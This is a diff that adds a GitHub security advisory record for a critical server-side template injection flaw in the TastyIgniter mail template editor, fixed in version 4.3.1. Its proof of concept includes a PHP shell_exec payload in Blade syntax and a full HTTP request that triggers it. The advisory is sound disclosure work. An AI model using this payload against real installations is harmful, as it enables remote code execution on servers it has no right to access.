@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-743w-g9pf-8p94",
+  "modified": "2026-11-25T22:24:13Z",
+  "published": "2026-11-25T22:24:13Z",
+  "aliases": [
+    "CVE-2026-69178"
+  ],
+  "summary": "TastyIgniter mail template editor allows remote code execution via server-side template injection",
+  "details": "### Summary\n**Where:** `POST /admin/mail_templates/edit/{id}` → body field  \n**Who can trigger:** Any admin user with `Admin.MailTemplates` permission  \n**Impact:** Arbitrary PHP execution on the server — full RCE\n\n### Details\nThe Mail templates is vulnerable to SSTI and did not perform an validation and sanitization.\n\n### PoC\n\n- login as admin\n- create new mail template with following command\n\n```\n@php echo shell_exec('echo \"RCE Executed\";id'); @endphp\n```  \n\n- save the request\n- execute the request using `X-IGNITER-REQUEST-HANDLER: onTestTemplate`\n\nRequest\n```http\nPOST /admin/mail_templates/edit/20 HTTP/1.1\nHost: localhost:8888\nContent-Length: 47\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-Requested-With: XMLHttpRequest\nX-IGNITER-REQUEST-PARTIALS: \nAccept: */*\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-IGNITER-REQUEST-HANDLER: onTestTemplate\nOrigin: http://localhost:8888\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/admin/mail_templates/edit/20\nAccept-Encoding: gzip, deflate, br\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6IjhvRGwrR1drU2JrTEhqcHh6QlNRdFE9PSIsInZhbHVlIjoiT2dpbUpNMGZkZzZUNVNZTFkyOFJtc25sZ2FXR3NxQ3JLMFBWUk5wNnl2WWtaNlpsNnBDYldFNkpMbEFKeVhnbjZWQW1MZzZPT3NjNlV0V3l5Z1NMVG9jamNFK0dzbFA4LzZhREFSNFFHQVNSTmJYOEFiOG0rZ0s2T1VQVmdCTlNrMVZ2dHBqMXMxazV5QWp2cXRCSjhoaU81aTlDeVBzaC9nbHlJRlM5SlYveDdTL2RUSG56NGZLQWNqOHVUTW5XalhjdWpwN1c3TjF6OGw3WVpNUndrZUY3dmRDQy8zR1J6MzJtaE81L1VxMD0iLCJtYWMiOiJmYzI5Y2E0ZTkyOTUyN2I5YmYzZjQzZWE0MDY2YTk0NTRkOWQ3MTEyODRmZjBjNzU2MGMyZWQwNmEwYWY5MDc1IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IlZpTmZQTTREUHhpTE44ZUgxZVZ5Zmc9PSIsInZhbHVlIjoiOTRWSUtCQjM2ZmRwdjA3MVI2aHBjM3dITDViL0t0ajlPd1dTQ0xCZ3IxVGNGQWk2bzlDUEtLeFRZTlBXZDc2V0tuREZWVTVBakJTRjU4d052aEZxeUEvcU1BVFhmMjlPY2RGOHdWY1p4d25saSs0UHovZzFQaU1FeU9vKy9tbEoiLCJtYWMiOiJlZmRhNjZmNWU0MmY2MjZjYzJjNjMyY2JlNTMwNmJjZDMxOTU3MzFkOWQ4MDZiOGVkM2I3ZmY4NTAxOTdhYTU5IiwidGFnIjoiIn0%3D; tastyigniter_session=eyJpdiI6IjRVU3c4T2Y2dnVhREtyZkxQZitPUHc9PSIsInZhbHVlIjoiWFFXaDVNbzJISlJZRjdRTVI3L2FNYUNxdklvVHZpb3FwNFA4M2J0aTBqNFI2VU8vL09lYWhlOVd3K1lhdFR5eEJTWUxxLzRHM0Z5KzlaUkhCOTdVMDEzc25PaWNzOE1yWW9PQkZSWHZZUVJGNnRkNGRuWVhvRC82RVl5YTU1ZnciLCJtYWMiOiI0ZjY2ODIxYWU1N2FkYmUxNGM5OWQ4ODU0MDU2YzRhODY1MmFlNmVkOTgwZTIzN2E0YjE0Y2MwMzg3NTc4MTZhIiwidGFnIjoiIn0%3D\nConnection: keep-alive\n\n_token=L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY\n```\n\n- For the response, can check in the log.\n\n<img width=\"1315\" height=\"516\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2b6a01bf-14d2-4b33-b1d4-d0e284b54107\" />\n\n   \n\n### Impact\nIf attacker have access to admin user, it is possible to abuse this vulnerability to gain access into the system.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "tastyigniter/tastyigniter"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.3.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tastyigniter/TastyIgniter/security/advisories/GHSA-743w-g9pf-8p94"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tastyigniter/core/commit/785aa660f77fee9a221857b8b1f11b68a35fd257"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tastyigniter/TastyIgniter"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tastyigniter/core/releases/tag/v4.3.1"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-1336"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-11-25T22:24:13Z",
+    "nvd_published_at": null
+  }
+}
